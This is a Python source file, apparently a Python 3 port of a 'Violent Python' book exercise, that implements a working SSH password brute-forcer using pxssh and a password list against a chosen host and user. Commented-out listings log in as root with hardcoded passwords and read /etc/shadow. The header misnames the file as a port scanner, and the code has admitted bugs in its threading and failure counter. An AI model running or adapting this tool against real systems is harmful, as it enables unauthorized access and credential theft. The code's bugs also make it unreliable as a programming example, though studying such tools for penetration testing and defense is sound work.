#!/usr/bin/env python3
#
# Filename: portScanner.py
#
# Violent Python - A Cookbook for Hackers,Forensic Analysts,Penetration Testers and Security Engineers
# Chapter 2 | FTP BotNet Portion of the Morris Work Lookalike - version 1
#
# NOTE: This is a modified version of the code from pages 41 through 55.
#
#       The original version supplied with the book can be downloaded from:
#
#       https://booksite.elsevier.com/9781597499576/?ISBN=9781597499576
#
#       and is saved here, for comparison, in the publishedCode sub-folder
#
# Original Author: TJ O'Connor
# Modified to run under Python 3.x by: Daniel Raphael
#
# ---------------------------------------------------------------------------------------------------------------------
#
# Introduces the pexpect module (external):
# Pexpect is a pure Python module for spawning child applications; controlling them; and responding to expected
# patterns in their output. Pexpect works like Don Libes’ Expect. Pexpect allows your script to spawn a child
# application and control it as if a human were typing commands.
#
#   http://pexpect.readthedocs.io/en/latest/
#
# Uses the threading module:
#
# Uses the argparse module:
# The argparse module makes it easy to write user-friendly command-line interfaces. The program defines what arguments
# it requires, and argparse will figure out how to parse those out of sys.argv. The argparse module also automatically
# generates help and usage messages and issues errors when users give the program invalid arguments.
#
#   https://docs.python.org/3.5/library/argparse.html?highlight=argparse#module-argparse
#
# Note that in the book there is code that checks to make sure neither option is == None and, if so, exit the program.
# This has been omitted as with argparse we can specify the "required=True" option and the module will handle this
# for us.
#
# I replaced optpares with argpares in the code as optparse has been  deprecated since v2.7:
#
#   https://www.python.org/dev/peps/pep-0389/
#
# Uses the sys module
# This module provides access to some variables used or maintained by the interpreter and to functions that interact
#  strongly with the interpreter. It is always available.
#
#   https://docs.python.org/3.5/library/sys.html?highlight=sys#module-sys
#
# ---------------------------------------------------------------------------------------------------------------------
#
# Mods made to run under Python 3.x follow. These include stylistic as well as functional code modifications.
#
# - int() : had to convert the target_port variable to an int.
#
# - encoding : had to convert the string sent to the remote server to byte encoding from utf-8:
#
#   socket_connection.send('ViolentPython\r\n') became socket_connection.send(b'ViolentPython\r\n')
#                                                                             ^
#
# - try/except :  Original code used a bare except clause. Python 3 considers this to be to generalized.
#       Updated the except clause to the more robust form:
#
#           except <exception type>  as e:
#
# - var/function naming style : Original code used camel case style naming.
#       Updated to use the underscore style:
#           retBanner became ret_banner, etc.
#
# - print : Converted all Python 2.x style print statements to use the Python 3.x print() function and
#   the .format string method instead of the string concatenations originally employed. I did this as it is
#   better performance wise and is more feature rich. For instance it does type conversion without the need to
#   call functions like str() and int() all the time.
#
#   print '[+] ' + ip + ' : ' + banner          became:     print('[+] {} : {}'.format(ip, banner))
#
# - exit() : converted all instances of "exit()" to "sys.exit()" as "exit()" is meant for the interactive
#   environment and "sys.exit()" is preferred for use in source files that will be executed from the command line.
#
# - f = open(filename, 'r') : changed this to use the more Pythonic form: with open(filename, 'rU') as f:
#
# - optparse code converted to argparse code. : This is not required to run under v3.x but optparse is deprecated since
#   v2.7 and moving to argparse is in keeping with my goal of not only converting v2.x specific code to v3.x but also
#   doing my best to make the code more modern and more Pythonic by current standards.
#
#   notable this version of the code makes use of the argparse.add_argument() "required=" argument buy setting it
#   equal to "True", rather than using code to test if the arguments were passed on the commandline.
#
#   if host == None or passwdFile == None or user == None:   became:    parser.add_argument(<flag>, required=True, ...)
#
# - import : import pxssh       became:      from pexpect import pxssh   because the old form would not properly
#   import pxssh from pexcpect otherwise.
#
# ---------------------------------------------------------------------------------------------------------------------
#
# Functional Changes
#
# Added code to check for Python3.x and exit if not available.
#
# Added a normally false '-d'/'--debug' option to control debug print statement output.
#
# Added a normally false '-t'/'--threaded' option to allow the program to be run threaded or non threaded.
# This was done because when run threaded the global variable 'found' is never set to 'True' so the program
# always runs through every password in the password file even after a match is found. Having the switch in-place
#
# Python3 is expected:
#
import sys
if sys.version_info[0] != 3 or sys.version_info[1] < 5:
    sys.exit('This program needs Python3.5.0+')
#
# ---------------------------------------------------------------------------------------------------------------------
#
# print('Python version is: {}'.format(sys.version_info))
#
# Interacting with SSH Through Pexpect (Initial FTP BotNet) code p.43-45
#
# import pexpect
#
#
# PROMPT = ['#', '>>>', '>', '\$']
#
#
# def send_command(child, cmd):
#     child.sendline(cmd)
#     child.expect(PROMPT)
#     print(child.before)
#
#
# def connect(user, host, password):
#     ssh_new_key = 'Are you sure you want to continue connecting'
#     connection_string = 'ssh {}@{}'.format(user, host)
#     child = pexpect.spawn(connection_string)
#     ret = child.expect([pexpect.TIMEOUT, ssh_new_key, '[P|p]assword:'])
#     if ret == 0:
#         print('[-] Error Connecting')
#         return
#     if ret == 1:
#         child.sendline('yes')
#         ret = child.expect([pexpect.TIMEOUT, '[P|p]assword:'])
#     if ret == 0:
#         print('[-] Error Connecting')
#         return
#     child.sendline(password)
#     child.expect(PROMPT)
#     return child
#
#
# def main():
#     host = '192.168.0.17'
#     user = 'root'
#     password = 'm3@tL01n!'
#     child = connect(user, host, password)
#     # send_command(child, 'cat /etc/shadow | grep root')
#     send_command(child, 'ls /usr/bin')
#
#
# if __name__ == '__main__':
#     main()
#
# ---------------------------------------------------------------------------------------------------------------------
#
# pp.45-46 Brute Forcing SSH Passwords with Pxssh
#
# from pexpect import pxssh                               # original code was 'import pxssh'. that won't work here.
# import sys
#
#
#
# def send_command(s, command):
#     s.sendline(command)
#     s.prompt()
#     print(s.before)
#
#
# def connect(host, user, password):
#     try:
#         s = pxssh.pxssh()
#         s.login(host, user, password)
#         return s
#
#     except OSError:
#         print('[-] Error Connecting')
#         sys.exit(0)                                     # using sys.exit(). exit() is for interactive interpreter.
#
#
# def main():                                             # added function main and code for handling it to clean up
#     # replace PASSWORD with test systems password       # original listing's name shadowing of variable "s"
#     s = connect('192.168.0.17', 'root', 'password')
#     send_command(s, 'cat /etc/shadow | grep root')
#
#
# if __name__ == '__main__':
#     main()
#
# ---------------------------------------------------------------------------------------------------------------------
#
from pexpect import pxssh                               # original code was 'import pxssh'. that won't work here.
import argparse                                         # original code used optparse
import time
from threading import *
# import threading                                      # required if  connection_lock = threading.Lock() uncommented
import sys

# use either the first line, or the last two lines, but not together.
# Neither currently produces the expected results.
# In either case 'threading' is never set to true so all the passwords in the file are tried,
# even if a match has already been found.
#
# The -T parser argument definition and the variable "Threaded" in function main() were meant for use with the
# connection lock method below. Problem was at the time I do not yet know how to make the program see the options
# for threading outside of main(), where these exist. if I put them inside main() en the connection_lock.release()
# statement in the connect function becomes undefined.
#
# connection_lock = threading.Lock()
max_connections = 15
connection_lock = BoundedSemaphore(value=max_connections)


found = False
fails = 0
debug = False


def connect(host, user, password, release):
    global debug
    global found

    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        found = True
        if debug:
            print('[***DEBUG***] Local (connect))found == {}'.format(found))
        print('[+] Password found: {}'.format(password))

    except Exception as e:
        if 'read_nonblocking' in str(e):
            fails += 1
            time.sleep(5)
            connect(host, user, password, False)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host, user, password, False)

    finally:
        if release:
            connection_lock.release()


def main():
    global found
    global fails
    global debug
    parser = argparse.ArgumentParser('usage:%prog -H <target host> -u <user> -F <password list>')
    parser.add_argument('-H', '--host',
                        required=True,
                        dest='target_host',
                        type=str,
                        help='specify target host')

    parser.add_argument('-F', '--input-file',
                        required=True,
                        dest='password_file',
                        type=str,
                        help='specify password file')

    parser.add_argument('-u', '--user',
                        required=True,
                        dest='user',
                        type=str,
                        help='specify the user')
    parser.add_argument('-d', '--debug',
                        action='store_true',
                        help='sends debug output to stdout')

    parser.add_argument('-t', '--threaded',
                        default=False,
                        action='store_true',
                        )

    # parser.add_argument('-T', '--Threaded',                             # Not currently used
    #                     default=False,
    #                     action='store_true',
    #                     help='run with thread locking'
    #                     )

    args = parser.parse_args()
    target_host = args.target_host
    password_file = args.password_file
    user = args.user
    threaded = args.threaded
    # Threaded = args.Threaded                                          # for Threading lock not Semaphore
    debug = args.debug

    with open(password_file, 'r') as file_name:
        for line in file_name.readlines():
            if debug:
                print('[*DBG*] {}'.format(('-' * 25)))
                print('[*DBG*] Filename: {} \| Read in: {}'.format(password_file, line, end="", flush=True))
                print('[*DBG*] Flags: found == {}\n[*DBG*] {}fails == {}'.format(found, (' ' * 7), found))
                print('[*DBG*] {}\n\n'.format(('-' * 25)))

            if found:
                print('[+] Exiting Password found')
                sys.exit(0)                                 # using sys.exit(). exit() is for interactive interpreter.

            if fails > 5:
                print('[-] Exiting: Too Many Socket Timeouts')
                sys.exit(0)

            if debug:
                print('[***DEBUG***] Local (main) found == {}'.format(found))

            connection_lock.acquire()
            password = line.strip('\r').strip('\n')
            print('[-] Testing: {}'.format(password))

            if threaded:
                t = Thread(target=connect, args=(target_host, user, password, True))
                child = t.start()
            else:
                connect(target_host, user, password, True)


if __name__ == '__main__':
    main()

